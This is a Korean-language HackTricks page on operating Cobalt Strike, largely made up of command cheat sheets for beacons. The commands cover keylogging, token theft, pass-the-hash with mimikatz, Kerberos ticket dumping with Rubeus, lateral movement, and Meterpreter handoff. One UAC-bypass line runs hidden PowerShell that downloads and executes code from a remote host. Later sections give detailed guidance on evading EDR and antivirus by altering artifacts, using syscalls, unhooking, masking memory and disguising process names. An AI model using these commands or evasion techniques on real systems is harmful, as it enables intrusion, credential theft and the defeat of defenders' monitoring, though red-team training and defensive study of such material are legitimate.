# Cobalt Strike

{{#include ../banners/hacktricks-training.md}}

### Listeners

### C2 Listeners

`Cobalt Strike -> Listeners -> Add/Edit`에서 어디에서 listen할지, 어떤 종류의 beacon을 사용할지(http, dns, smb...) 등을 선택할 수 있습니다.

### Peer2Peer Listeners

이러한 Listener의 beacon은 C2와 직접 통신할 필요가 없으며, 다른 beacon을 통해 C2와 통신할 수 있습니다.

`Cobalt Strike -> Listeners -> Add/Edit`에서 TCP 또는 SMB beacon을 선택해야 합니다.

* **TCP beacon은 선택한 포트에서 listener를 설정합니다**. TCP beacon에 연결하려면 다른 beacon에서 `connect <ip> <port>` 명령을 사용합니다.
* **smb beacon은 선택한 이름의 pipename에서 listen합니다**. SMB beacon에 연결하려면 `link [target] [pipe]` 명령을 사용해야 합니다.

### Payload 생성 및 Host

#### 파일로 payload 생성

`Attacks -> Packages ->`

* **`HTMLApplication`** HTA 파일용
* **`MS Office Macro`** macro가 포함된 office 문서용
* **`Windows Executable`** .exe, .dll 또는 service .exe용
* **`Windows Executable (S)`** **stageless** .exe, .dll 또는 service .exe용 (staged보다 stageless가 더 좋으며 IoC가 적음)

#### Payload 생성 및 Host

`Attacks -> Web Drive-by -> Scripted Web Delivery (S)`는 bitsadmin, exe, powershell 및 python과 같은 형식으로 Cobalt Strike에서 beacon을 다운로드하는 script/executable을 생성합니다.

#### Payload Host

Web server에서 Host하려는 파일이 이미 있다면 `Attacks -> Web Drive-by -> Host File`로 이동하여 Host할 파일과 web server 설정을 선택합니다.

### Beacon 옵션

<details>
<summary>Beacon 옵션 및 명령</summary>
```bash
# Execute local .NET binary
execute-assembly </path/to/executable.exe>
# Note that to load assemblies larger than 1MB, the 'tasks_max_size' property of the malleable profile needs to be modified.

# Screenshots
printscreen    # Take a single screenshot via PrintScr method
screenshot     # Take a single screenshot
screenwatch    # Take periodic screenshots of desktop
## Go to View -> Screenshots to see them

# keylogger
keylogger [pid] [x86|x64]
## View > Keystrokes to see the keys pressed

# portscan
portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # Inject portscan action inside another process
portscan [targets] [ports] [arp|icmp|none] [max connections]

# Powershell
## Import Powershell module
powershell-import C:\path\to\PowerView.ps1
powershell-import /root/Tools/PowerSploit/Privesc/PowerUp.ps1
powershell <just write powershell cmd here> # Uses the highest supported PowerShell version (not OPSEC-friendly)
powerpick <cmdlet> <args> # This creates a sacrificial process specified by spawnto, and injects UnmanagedPowerShell into it for better opsec (not logging)
powerpick Invoke-PrivescAudit | fl
psinject <pid> <arch> <commandlet> <arguments> # This injects UnmanagedPowerShell into the specified process to run the PowerShell cmdlet.


# User impersonation
## Token generation with creds
make_token [DOMAIN\user] [password] #Create token to impersonate a user in the network
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token generated with make_token
## The use of make_token generates event 4624: An account was successfully logged on.  This event is very common in a Windows domain, but can be narrowed down by filtering on the Logon Type.  As mentioned above, it uses LOGON32_LOGON_NEW_CREDENTIALS which is type 9.

# UAC Bypass
elevate svc-exe <listener>
elevate uac-token-duplication <listener>
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"

## Steal token from pid
## Like make_token but stealing the token from a process
steal_token [pid] # Also, this is useful for network actions, not local actions
## From the API documentation we know that this logon type "allows the caller to clone its current token". This is why the Beacon output says Impersonated <current_username> - it's impersonating our own cloned token.
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token from steal_token

## Launch process with nwe credentials
spawnas [domain\username] [password] [listener] #Do it from a directory with read access like: cd C:\
## Like make_token, this will generate Windows event 4624: An account was successfully logged on but with a logon type of 2 (LOGON32_LOGON_INTERACTIVE).  It will detail the calling user (TargetUserName) and the impersonated user (TargetOutboundUserName).

## Inject into process
inject [pid] [x64|x86] [listener]
## From an OpSec point of view: Don't perform cross-platform injection unless you really have to (e.g. x86 -> x64 or x64 -> x86).

## Pass the hash
## This modification process requires patching of LSASS memory which is a high-risk action, requires local admin privileges and not all that viable if Protected Process Light (PPL) is enabled.
pth [pid] [arch] [DOMAIN\user] [NTLM hash]
pth [DOMAIN\user] [NTLM hash]

## Pass the hash through mimikatz
mimikatz sekurlsa::pth /user:<username> /domain:<DOMAIN> /ntlm:<NTLM HASH> /run:"powershell -w hidden"
## Without /run, Mimikatz spawns cmd.exe; an interactive desktop user may see the shell (SYSTEM sessions are not normally visible)
steal_token <pid> #Steal token from process created by mimikatz

## Pass the ticket
## Request a ticket
execute-assembly /root/Tools/SharpCollection/Seatbelt.exe -group=system
execute-assembly C:\path\Rubeus.exe asktgt /user:<username> /domain:<domain> /aes256:<aes_keys> /nowrap /opsec
## Create a new logon session to use with the new ticket (to not overwrite the compromised one)
make_token <domain>\<username> DummyPass
## Write the ticket on the attacker machine from a PowerShell session and load it
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi

## Pass the ticket from SYSTEM
## Generate a new process with the ticket
execute-assembly C:\path\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES KEY> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
## Steal the token from that process
steal_token <pid>

## Extract ticket + Pass the ticket
### List tickets
execute-assembly C:\path\Rubeus.exe triage
### Dump an interesting ticket by LUID
execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
### Create new logon session, note luid and processid
execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
### Insert ticket in generate logon session
execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
### Finally, steal the token from that new process
steal_token <pid>

# Lateral Movement
## If a token was created it will be used
jump [method] [target] [listener]
## Methods:
## psexec                    x86   Use a service to run a Service EXE artifact
## psexec64                  x64   Use a service to run a Service EXE artifact
## psexec_psh                x86   Use a service to run a PowerShell one-liner
## winrm                     x86   Run a PowerShell script via WinRM
## winrm64                   x64   Run a PowerShell script via WinRM
## wmi_msbuild               x64   WMI lateral movement with an MSBuild inline C# task (OPSEC)


remote-exec [method] [target] [command] # remote-exec doesn't return output
## Methods:
## psexec                          Remote execute via Service Control Manager
## winrm                           Remote execute via WinRM (PowerShell)
## wmi                             Remote execute via WMI

## To execute a beacon with wmi (it isn't in the jump command) just upload the beacon and execute it
beacon> upload C:\Payloads\beacon-smb.exe
beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe


# Pass session to Metasploit - Through listener
## On the Metasploit host
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST eth0
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > exploit -j

## On cobalt: Listeners > Add and set the Payload to Foreign HTTP. Set the Host to 10.10.5.120, the Port to 8080 and click Save.
beacon> spawn metasploit
## You can only spawn x86 Meterpreter sessions with the foreign listener.

# Pass session to Metasploit - Through shellcode injection
## On metasploit host
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=<IP> LPORT=<PORT> -f raw -o /tmp/msf.bin
## Run msfvenom and prepare the multi/handler listener

## Copy bin file to cobalt strike host
ps
shinject <pid> x64 C:\Payloads\msf.bin #Inject metasploit shellcode in a x64 process

# Pass metasploit session to cobalt strike
## Generate stageless Beacon shellcode: go to Attacks > Packages > Windows Executable (S), select the listener, choose Raw output, and enable the x64 payload.
## Use post/windows/manage/shellcode_inject in metasploit to inject the generated cobalt srike shellcode


# Pivoting
## Open a socks proxy in the teamserver
beacon> socks 1080

# SSH connection
beacon> ssh 10.10.17.12:22 username password
```
</details>

### Custom implants / Linux Beacons

- Custom agent는 등록/체크인하고 task를 수신하기 위해 Cobalt Strike Team Server HTTP/S protocol (default malleable C2 profile)만 사용하면 된다. profile에 정의된 동일한 URI/header/metadata crypto를 구현하면 tasking 및 output에 Cobalt Strike UI를 재사용할 수 있다.<sup>[[1]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>
- Aggressor Script (예: `CustomBeacon.cna`)는 non-Windows beacon의 payload 생성을 래핑하여 operator가 listener를 선택하고 GUI에서 직접 ELF payload를 생성할 수 있게 한다.
- Team Server에 노출되는 Linux task handler의 예: `sleep`, `cd`, `pwd`, `shell` (임의의 command 실행), `ls`, `upload`, `download`, `exit`. 이러한 handler는 Team Server가 예상하는 task ID에 매핑되며, 적절한 형식으로 output을 반환하도록 server-side에서 구현해야 한다.
- Linux에서 BOF support는 [TrustedSec's ELFLoader](https://github.com/trustedsec/ELFLoader)를 사용하여 Beacon Object Files를 in-process로 로드하는 방식으로 추가할 수 있다 (Outflank-style BOF도 지원). 이를 통해 새로운 process를 생성하지 않고 implant의 context/privileges 내부에서 modular post-exploitation을 실행할 수 있다.<sup>[[2]](#references)[[3]](#references)</sup>
- custom beacon에 SOCKS handler를 embed하여 Windows Beacons와의 pivoting parity를 유지한다. operator가 `socks <port>`를 실행하면 implant는 local proxy를 열어 compromised Linux host를 통해 operator tooling을 internal network로 라우팅해야 한다.

## Opsec

### Execute-Assembly

**`execute-assembly`**는 **sacrificial process**를 사용하고 remote process injection을 통해 지정된 program을 실행한다. process에 inject하려면 모든 EDR이 확인하는 특정 Win API가 사용되므로 매우 noisy하다. 그러나 동일한 process에 무언가를 로드하는 데 사용할 수 있는 custom tool이 있다.

- [https://github.com/anthemtotheego/InlineExecute-Assembly](https://github.com/anthemtotheego/InlineExecute-Assembly)
- [https://github.com/kyleavery/inject-assembly](https://github.com/kyleavery/inject-assembly)
- Cobalt Strike에서는 BOF (Beacon Object Files)도 사용할 수 있다: [https://github.com/CCob/BOF.NET](https://github.com/CCob/BOF.NET)

agressor script `https://github.com/outflanknl/HelpColor`는 Cobalt Strike에 `helpx` command를 생성한다. 이 command는 command에 색상을 추가하여 해당 command가 BOF인지 (green), Frok&Run인지 (yellow) 및 유사한 유형인지, 또는 ProcessExecution, injection 및 유사한 유형인지 (red)를 표시한다. 이를 통해 어떤 command가 더 stealthy한지 파악할 수 있다.

### 사용자를 가장하기

`Seatbelt.exe LogonEvents ExplicitLogonEvents PoweredOnEvents`와 같은 event를 확인할 수 있다.

- Security EID 4624 - 일반적인 업무 시간을 파악하기 위해 모든 interactive logon을 확인한다.
- System EID 12,13 - shutdown/startup/sleep 빈도를 확인한다.
- Security EID 4624/4625 - inbound valid/invalid NTLM 시도를 확인한다.
- Security EID 4648 - plaintext credential이 logon에 사용될 때 생성되는 event다. process가 이를 생성했다면 binary에 credential이 clear text로 config file 또는 code 내부에 포함되어 있을 가능성이 있다.

Cobalt Strike에서 `jump`를 사용할 때는 새로운 process가 더 정상적인 것으로 보이도록 `wmi_msbuild` method를 사용하는 것이 좋다.

### computer account 사용

Defender는 user가 생성한 이상한 동작을 확인하고 **`*$`와 같은 service account 및 computer account를 monitoring에서 제외**하는 경우가 많다. 이러한 account를 사용하여 lateral movement 또는 privilege escalation을 수행할 수 있다.

### stageless payload 사용

Stageless payload는 C2 server에서 second stage를 download할 필요가 없으므로 staged payload보다 덜 noisy하다. 즉, initial connection 이후에는 network traffic을 생성하지 않으므로 network-based defense에 탐지될 가능성이 낮아진다.

### Tokens & Token Store

token을 훔치거나 생성할 때 주의해야 한다. EDR은 thread token을 enumerate하여 **다른 user에 속한 token** 또는 process 내부의 SYSTEM token까지 탐지할 수 있다.

이를 통해 token을 **beacon별로** 저장할 수 있으므로 동일한 token을 반복해서 훔칠 필요가 없다. 이는 lateral movement 또는 훔친 token을 여러 번 사용해야 할 때 유용하다.

- `token-store steal <pid>`
- `token-store steal-and-use <pid>`
- token-store show
- `token-store use <id>`
- `token-store remove <id>`
- token-store remove-all

lateral movement를 수행할 때는 일반적으로 새로운 token을 **생성하거나 pass the hash attack을 수행하는 것보다 token을 훔치는 것**이 더 좋다.

### Guardrails

Cobalt Strike에는 Defender가 탐지할 수 있는 특정 command 또는 action의 사용을 방지하는 **Guardrails**라는 기능이 있다. Guardrails는 lateral movement 또는 privilege escalation에 일반적으로 사용되는 `make_token`, `jump`, `remote-exec` 및 기타 command와 같은 특정 command를 block하도록 구성할 수 있다.

또한 [https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks](https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks) repo에는 payload를 실행하기 전에 고려할 수 있는 몇 가지 check와 idea도 포함되어 있다.

### Tickets encryption

AD에서는 ticket의 encryption에 주의해야 한다. 기본적으로 일부 tool은 Kerberos ticket에 RC4 encryption을 사용하는데, 이는 AES encryption보다 덜 secure하며 최신 environment에서는 기본적으로 AES를 사용한다. weak encryption algorithm을 monitoring하는 Defender가 이를 탐지할 수 있다.

### 기본값 피하기

Cobalt Stricke를 사용할 때 기본적으로 SMB pipe의 이름은 `msagent_####` 및 `"status_####"`다. 이러한 이름을 변경한다. Cobal Strike에서 다음 command로 기존 pipe의 이름을 확인할 수 있다: `ls \\.\pipe\`

또한 SSH session에서는 `\\.\pipe\postex_ssh_####`라는 pipe가 생성된다. `set ssh_pipename "<new_name>";`으로 변경한다.

post-exploitation attack에서도 `\\.\pipe\postex_####` pipe를 `set pipename "<new_name>"`으로 수정할 수 있다.

Cobalt Strike profile에서는 다음과 같은 항목도 수정할 수 있다.

- `rwx` 사용을 피하는 방법
- process injection 동작 방식 (`process-inject {...}` block에서 사용할 API)
- "fork and run" 동작 방식 (`post-ex {…}` block)
- sleep time
- memory에 로드할 binary의 max size
- `stage {...}` block을 사용한 memory footprint 및 DLL content
- network traffic

### memory scanning 우회

일부 ERD는 알려진 malware signature를 찾기 위해 memory를 scan한다. Coblat Strike는 `sleep_mask` function을 BOF로 수정할 수 있도록 하며, 이를 통해 memory에서 backdoor를 encrypt할 수 있다.

### noisy proc injection

process에 code를 inject하는 작업은 일반적으로 매우 noisy하다. **일반적인 process는 보통 이 action을 수행하지 않으며 이를 수행하는 방법도 매우 제한적**이기 때문이다. 따라서 behaviour-based detection system에 탐지될 수 있다. 또한 disk에 존재하지 않는 **code를 포함한 thread**를 찾기 위해 network를 scan하는 EDR에도 탐지될 수 있다 (JIT를 사용하는 browser와 같은 process에서는 흔히 발생하지만). Example: [https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2](https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2)

### Spawnas | PID and PPID relationships

새로운 process를 spawn할 때는 탐지를 피하기 위해 process 간 **일반적인 parent-child** relationship을 유지하는 것이 중요하다. svchost.exec가 iexplorer.exe를 실행한다면 의심스럽게 보일 수 있다. 정상적인 Windows environment에서 svchost.exe는 iexplorer.exe의 parent가 아니기 때문이다.

Cobalt Strike에서 새로운 beacon을 spawn하면 기본적으로 **`rundll32.exe`**를 사용하는 process가 생성되어 새로운 listener를 실행한다. 이는 그다지 stealthy하지 않으며 EDR에 쉽게 탐지될 수 있다. 또한 `rundll32.exe`가 아무런 args 없이 실행되므로 더욱 의심스럽다.

다음 Cobalt Strike command를 사용하면 새로운 beacon을 spawn할 다른 process를 지정하여 탐지 가능성을 낮출 수 있다.
```bash
spawnto x86 svchost.exe
```
프로필에서 이 설정 **`spawnto_x86` and `spawnto_x64`**도 변경할 수 있습니다.

### 공격자 트래픽 Proxying

공격자는 때때로 Linux 머신에서도 도구를 로컬에서 실행하고, victim의 트래픽이 해당 도구에 도달하도록 해야 합니다(예: NTLM relay).

또한 때때로 pass-the.hash 또는 pass-the-ticket attack을 수행할 때 공격자가 이 hash 또는 ticket을 victim 머신의 LSASS process를 수정하는 대신 **자신의 LSASS process에 로컬로 추가한 다음**, 이를 통해 pivot하는 편이 더 stealthier합니다.

하지만 **생성되는 트래픽에 주의해야 합니다**. backdoor process에서 비정상적인 트래픽(kerberos?)을 전송할 수 있기 때문입니다. 이를 위해 browser process로 pivot할 수 있습니다(자기 자신을 process에 injecting하다가 탐지될 수 있으므로 stealth하게 수행할 방법을 고려해야 합니다).


### AVs 회피

#### AV/AMSI/ETW Bypass

다음 페이지를 확인하세요:


{{#ref}}
av-bypass.md
{{#endref}}


#### Artifact Kit

일반적으로 `/opt/cobaltstrike/artifact-kit`에서 Cobalt Strike가 binary beacons를 생성하는 데 사용할 payloads의 code와 pre-compiled templates(`/src-common`)를 찾을 수 있습니다.

생성된 backdoor(또는 단순히 compiled template)에 [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck)를 사용하면 defender가 trigger되는 원인을 찾을 수 있습니다. 대개 string입니다. 따라서 backdoor를 생성하는 code를 수정하여 해당 string이 최종 binary에 나타나지 않도록 하면 됩니다.

code를 수정한 후 동일한 directory에서 `./build.sh`를 실행하고 `dist-pipe/` folder를 Windows client의 `C:\Tools\cobaltstrike\ArtifactKit`에 복사하세요.
```
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```
Cobalt Strike가 로드된 리소스가 아니라 우리가 원하는 디스크의 리소스를 사용하도록 하려면 aggressive script `dist-pipe\artifact.cna`를 로드하는 것을 잊지 마세요.

#### Resource Kit

ResourceKit 폴더에는 PowerShell, VBA 및 HTA를 포함한 Cobalt Strike의 script-based payloads용 templates가 포함되어 있습니다.

templates와 함께 [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck)를 사용하면 defender(이 경우 AMSI)가 탐지하는 부분을 확인하고 수정할 수 있습니다:
```
.\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
```
감지된 줄을 수정하면 탐지되지 않는 template을 생성할 수 있습니다.

공격적인 script인 `ResourceKit\resources.cna`를 load하여, Cobalt Strike가 이미 load된 리소스가 아닌 우리가 원하는 디스크의 리소스를 사용하도록 하는 것을 잊지 마세요.

#### Function hooks | Syscall

Function hooking은 ERD가 악성 activity를 탐지하는 데 사용하는 매우 일반적인 방법입니다. Cobalt Strike는 **`None`** config를 사용하여 표준 Windows API 호출 대신 **syscalls**를 사용하거나, **`Direct`** setting으로 함수의 **`Nt*`** version을 사용하거나, malleable profile에서 **`Indirect`** option을 사용하여 **`Nt*`** 함수를 건너뛰는 방식으로 이러한 hooks를 우회할 수 있습니다. 시스템에 따라 어떤 option이 다른 option보다 더 stealthy할 수 있습니다.

이는 profile에서 설정하거나 **`syscall-method`** command를 사용하여 설정할 수 있습니다.

하지만 이 방법 역시 noisy할 수 있습니다.

Cobalt Strike에서 function hooks를 우회하기 위해 제공하는 option 중 하나는 다음을 사용하여 해당 hooks를 제거하는 것입니다: [**unhook-bof**](https://github.com/Cobalt-Strike/unhook-bof).

또한 [**https://github.com/Mr-Un1k0d3r/EDRs**](https://github.com/Mr-Un1k0d3r/EDRs) 또는 [**https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector**](https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector)의 functions를 사용하여 어떤 functions가 hooked되었는지 확인할 수도 있습니다.




<details>
<summary>기타 Cobalt Strike commands</summary>
```bash
cd C:\Tools\neo4j\bin
neo4j.bat console
http://localhost:7474/ --> Change password
execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c All -d DOMAIN.LOCAL



# Change powershell
C:\Tools\cobaltstrike\ResourceKit
template.x64.ps1
# Change $var_code -> $polop
# $x --> $ar
cobalt strike --> script manager --> Load --> Cargar C:\Tools\cobaltstrike\ResourceKit\resources.cna

#artifact kit
cd  C:\Tools\cobaltstrike\ArtifactKit
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .


```
</details>

## References

- [1] [Cobalt Strike Linux Beacon (custom implant PoC)](https://github.com/EricEsquivel/CobaltStrike-Linux-Beacon)
- [2] [TrustedSec ELFLoader 및 Linux BOFs](https://github.com/trustedsec/ELFLoader)
- [3] [Outflank nix BOF template](https://github.com/outflanknl/nix_bof_template)
- [4] [Cobalt Strike metadata encryption에 대한 Unit42 분석](https://unit42.paloaltonetworks.com/cobalt-strike-metadata-encryption-decryption/)
- [5] [Cobalt Strike traffic에 대한 SANS ISC diary](https://isc.sans.edu/diary/27968)
- [6] [cs-decrypt-metadata-py](https://blog.didierstevens.com/2021/10/22/new-tool-cs-decrypt-metadata-py/)
- [7] [SentinelOne CobaltStrikeParser](https://github.com/Sentinel-One/CobaltStrikeParser)
{{#include ../banners/hacktricks-training.md}}
